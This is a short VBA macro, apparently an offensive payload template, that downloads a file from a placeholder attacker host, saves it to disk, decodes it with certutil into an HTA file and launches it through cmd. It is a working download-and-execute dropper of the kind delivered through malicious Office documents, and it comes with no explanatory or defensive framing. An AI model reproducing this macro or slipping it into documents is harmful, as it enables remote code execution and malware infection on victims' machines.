```
Sub DownloadAndExec()

Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://<attacker>/encoded.crt", False
xHttp.Send

With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile "encoded.crt", 2
End With

Shell ("cmd /c certutil -decode encoded.crt encoded.hta & start encoded.hta")

End Sub

```
